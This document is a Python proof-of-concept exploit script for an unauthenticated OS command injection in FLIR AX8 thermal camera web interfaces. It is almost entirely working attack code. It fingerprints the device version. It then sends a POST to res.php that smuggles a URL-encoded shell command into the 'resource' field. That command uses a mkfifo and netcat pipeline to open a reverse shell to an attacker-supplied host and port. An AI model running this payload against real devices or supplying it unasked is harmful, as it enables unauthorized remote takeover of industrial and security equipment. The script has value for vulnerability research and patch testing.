1
# -*- coding: utf-8 -*-

# Exploit Title: FLIR AX8 Unauthenticated OS Command Injection
# Date: 9/2/2022
# Vendor Homepage: https://www.flir.com/
# Software Link: https://www.flir.com/products/ax8-automation/
# Version: 1.46.16 and under.
# Tested on: FLIR AX8 version 1.46.16 (Ubuntu)

from __future__ import print_function, unicode_literals
from bs4 import BeautifulSoup
import argparse
import requests
import json
import urllib3
urllib3.disable_warnings()

def banner():
  flirLogo = """ 
flir
  """
  return print('\033[1;94m{}\033[1;m'.format(flirLogo))

def pingWebInterface(RHOST, RPORT):
  url = 'http://{}:{}/login/'.format(RHOST, RPORT)
  response = requests.get(url, allow_redirects=False, verify=False, timeout=60)
  try:
    if response.status_code != 200:
      print('[!] \033[1;91mError: FLIR AX8 device web interface is not reachable. Make sure the specified IP is correct.\033[1;m')
      exit()
    soup = BeautifulSoup(response.content.decode('utf-8'), 'html.parser')
    version = soup.find('p', id = 'login-title').string
    print('[INFO] {} detected.'.format(version))
  except:
    print('[ERROR] Can\'t grab the device version...')


def execReverseShell(RHOST, RPORT, LHOST, LPORT):
  url = 'http://{}:{}/res.php'.format(RHOST, RPORT)
  payload = 'rm%20%2Ftmp%2Ff%3Bmkfifo%20%2Ftmp%2Ff%3Bcat%20%2Ftmp%2Ff%7Csh%20-i%202%3E%261%7Cnc%20{}%20{}%20%3E%2Ftmp%2Ff'.format(LHOST, LPORT)
  data = 'action=get&resource=;{}'.format(payload)

  headers = {
    'Content-Type': 'application/x-www-form-urlencoded; charset=UTF-8',
  }

  try:
    print('[INFO] Executing reverse shell...')
    response = requests.post(url, headers=headers, data=data, allow_redirects=False, verify=False)
    print('Reverse shell successfully executed. {}:{}'.format(LHOST, LPORT))
    return
  except Exception as e:
      print('Reverse shell failed. Make sure the FLIR AX8 device can reach the host {}:{}').format(LHOST, LPORT)
      return False


def main():
  banner()
  args = parser.parse_args()
  pingWebInterface(args.RHOST, args.RPORT)
  execReverseShell(args.RHOST, args.RPORT, args.LHOST, args.LPORT)


if __name__ == "__main__":
  parser = argparse.ArgumentParser(description='Script PoC that exploit an unauthenticated remote command injection on FLIR AX8 devices.', add_help=False)
  parser.add_argument('--RHOST', help="Refers to the IP of the target machine. (FLIR AX8 device)", type=str, required=True)
  parser.add_argument('--RPORT', help="Refers to the open port of the target machine.", type=int, required=True)
  parser.add_argument('--LHOST', help="Refers to the IP of your machine.", type=str, required=True)
  parser.add_argument('--LPORT', help="Refers to the open port of your machine.", type=int, required=True)
  main()
